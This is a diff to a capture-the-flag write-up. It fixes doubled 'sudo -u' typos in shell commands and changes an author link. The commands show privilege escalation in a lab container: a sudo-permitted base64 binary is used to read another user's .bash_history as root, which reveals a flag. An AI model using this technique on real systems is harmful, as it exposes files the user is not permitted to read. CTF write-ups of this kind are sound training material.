@@ -65,7 +65,7 @@ crypto_vamp@c81ec1737490:~$
 Checking for another basic `sudo -l` from the `c` flag, we can see that we can actually run `/usr/bin/base64` as `root` on the machine without password. There's another user called `spookyboi` whose `bash_history` doesn't seems to be empty. So using the given `base64` binary, let's read the history.
 
 ```bash
-crypto_vamp@c81ec1737490:~$ sudo -u sudo -u lilith /opt/reader -c "sudo -l"
+crypto_vamp@c81ec1737490:~$ sudo -u lilith /opt/reader -c "sudo -l"
 1: Matching Defaults entries for lilith on c81ec1737490:
 2:     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sb3: in\:/bin\:/snap/bin
 4:
@@ -77,7 +77,7 @@ crypto_vamp@c81ec1737490:~$
 ```
 
 ```bash
-crypto_vamp@c81ec1737490:~$ sudo -u sudo -u lilith /opt/reader -c "ls -al /home/spookyboi"
+crypto_vamp@c81ec1737490:~$ sudo -u lilith /opt/reader -c "ls -al /home/spookyboi"
 1: total 48
 2: drwxrwxr-x 1 spookyboi spookyboi 4096 Oct 13 22:50 .
 3: drwxrwxr-x 1 root      root      4096 Oct 13 22:41 ..
@@ -91,7 +91,7 @@ crypto_vamp@c81ec1737490:~$ sudo -u sudo -u lilith /opt/reader -c "ls -al /home/
 11: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Public
 12: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Templates
 13: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Videos
-crypto_vamp@c81ec1737490:~$ sudo -u sudo -u lilith /opt/reader -c "sudo /usr/bin/base64 /home/spookyboi/.bash_history | base64 -d"
+crypto_vamp@c81ec1737490:~$ sudo -u lilith /opt/reader -c "sudo /usr/bin/base64 /home/spookyboi/.bash_history | base64 -d"
 1: ls -l
 2: cd ~
 3: mkdir docs
@@ -124,4 +124,4 @@ XX2nkn3W                                            [ <=>                       
 flag{b4d_h1sTOrY}
 ```
 
-##### Author: <a href="https://twitter.com/avijneyam">Avijneyam</a>
+##### Author: <a href="https://twitter.com/avijneyam" target="_blank">Avijneyam</a>
